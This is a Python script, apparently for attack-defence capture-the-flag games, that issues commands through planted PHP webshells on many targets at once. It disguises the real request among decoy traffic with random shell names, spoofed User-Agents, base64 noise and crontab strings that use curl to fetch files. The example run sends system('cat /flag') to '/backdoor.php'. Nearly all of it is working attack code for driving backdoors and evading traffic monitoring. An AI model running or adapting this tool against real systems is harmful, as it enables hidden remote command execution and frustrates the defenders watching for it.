#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import string
import random
import asyncio

from common import logger, md5, b64e, rsa_decrypt, find_flag, \
    USER_AGENTS, KEYWORDS

'''
    混淆流量攻击
    混淆请求 MixRequest - 万假一真 - 还是RSA
    正常请求 NormalRequest - 快速上 Shell & Agent
'''


class NormalRequest:
    """正常流量请求
    """

    callback = []
    target = ''

    def __init__(self, shell, passwd, payload, targets):
        self.shell = shell
        self.passwd = passwd
        self.payload = payload
        self.q_target = asyncio.Queue(maxsize=100)
        [self.q_target.put_nowait(target) for target in targets]
        self.loop = asyncio.get_event_loop()

    def _save_resp(self, target, data):
        with open("./logs/resp_%s.log" % target, 'a+') as f:
            f.write(data)
            f.flush()

    def _request(self, target, shell, isPost, headers, payload, rsa=0):
        logger.debug("[#] Request _request...")
        if not shell.startswith("/"):
            shell = "/" + shell
        url = "http://" + target + shell
        logger.debug("[#] Request [%s]  ..." % url)
        try:
            if isPost:
                resp = requests.post(url, headers=headers,
                                     data=payload, timeout=3)
            else:
                resp = requests.get(url, headers=headers,
                                    params=payload, timeout=3)
            if resp.status_code == 200:
                obj = resp.text if not rsa else rsa_decrypt(resp.text)
                obj = obj.strip()
                logger.debug("[#] Is RSA : %d" % rsa)
                logger.debug("[#] Resp : %s" % obj)
                if obj and self.callback and isinstance(self.callback, list):
                    for cb in self.callback:
                        if callable(cb):
                            cb(target, obj)
                elif obj and callable(self.callback):
                    self.callback(target, obj)
            return True
        except Exception as e:
            logger.warn("[!] %s" % e)
            return False

    def attack(self, target):
        logger.debug("[#] Request attack...")
        headers = {
            "User-Agent": random.choice(USER_AGENTS)
        }
        if self.passwd:
            data = {
                self.passwd: self.payload
            }
            rsa = 0
        else:
            data = self.payload
            rsa = 1
        self._request(target, self.shell, True, headers, data, rsa)

    async def run(self):
        logger.debug("[#] Request Running...")
        while not self.q_target.empty():
            target = await self.q_target.get()
            try:
                logger.debug("[#] Run target [%s] ..." % target)
                self.attack(target)
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.debug("[#] Run Exception : %s" % e)
                continue

    def start(self, num=10):
        """启动请求 @num 协程数量
        """
        logger.info("[+] Start attack...")
        tasks = [self.run() for i in range(num)]
        self.loop.run_until_complete(asyncio.wait(tasks))
        self.loop.close()


class MixRequest(NormalRequest):
    """混淆流量请求
    """

    def __init__(self, shell, passwd, payload, targets):
        super().__init__(shell, passwd, payload, targets)
        self.prepare()

    def random_str(self, n=8):
        return ''.join(random.sample(string.ascii_letters + string.digits, n))

    def random_bytes(self, _min=102, _max=1024):
        return bytes(''.join([chr(random.randint(1, 255)) for i in range(random.randint(_min, _max))]), 'utf-8')

    def random_shell_name(self, ext=".php"):
        return "/" + md5(self.random_str()) + ext

    def random_data(self, target="", path="/var/www/html/"):
        k = random.randint(1, 12)
        keyworkd = random.choice(KEYWORDS)
        if k > 3:
            name = self.random_shell_name()
            keyworkd = "echo '*/1 * * * * /bin/cat /tmp/{} > {}{};/usr/bin/curl \"{}{}\"' | crontab".format(
                self.random_str(), path, name, target, name)
        elif k > 6:
            keyworkd = (b64e(keyworkd)*random.randint(3, 5))
        elif k > 9:
            keyworkd = keyworkd
        return keyworkd

    def attack(self, target):
        self.target = target
        for weapon in self.ammunitions:
            self._request(target,  weapon['name'], True,
                          weapon['headers'], weapon['data'], weapon['rsa'])

    def prepare(self):
        self.ammunitions = []
        _num = random.randint(6, 18)
        _real = random.randint(1, 18)
        logger.info("[+] Mix Flow Number : %d" % _num)
        for i in range(_num):
            rsa = 0
            if random.choice([1, 0]):
                shell_name = self.random_shell_name()
            else:
                shell_name = self.shell
            if _real == i:
                # 攻击流量
                shell_name = self.shell
                if self.passwd:
                    data = {
                        self.passwd: self.payload
                    }
                else:
                    data = self.payload
                    rsa = 1
                logger.debug("[#] Real Attack %s" % shell_name)
            elif i % 2 == 0:
                data = {
                    'p': md5(str(random.randint(1000000, 1000050))),
                    'c': self.random_data()
                }
            else:
                data = b64e(self.random_bytes())
                rsa = 1
            headers = {
                "User-Agent": random.choice(USER_AGENTS)
            }
            self.ammunitions.append({
                "data": data,
                "headers": headers,
                "name": shell_name,
                "rsa": rsa
            })

    def test(self):
        self.prepare()
        for weapon in self.ammunitions:
            print(weapon)


if __name__ == "__main__":
    def cb_show(target, resp_text):
        logger.debug("[#] Target: %s Text: %s" % (target, resp_text))
        flags = find_flag(resp_text)
        logger.info("[+] Target : %s s- Flag : %s" % (target, ','.join(flags)))

    targets = ['127.0.0.1:8085', '127.0.0.1:8085']
    x = MixRequest('/backdoor.php', "1", "system('cat /flag');", targets)
    x.callback = cb_show
    x.start(1)
